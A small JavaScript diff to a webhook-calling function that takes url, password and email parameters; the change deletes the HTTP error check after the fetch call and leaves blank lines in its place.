@@ -26,10 +26,8 @@ window.function = async function(url, pwd, email) {
 
     const response = await fetch(`${webhook}`, requestOptions);
     
-    // Check if the response is successful
-    if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
-    }
+  
+   
 
     // Read the response body as plain text
     const data = await response.text();
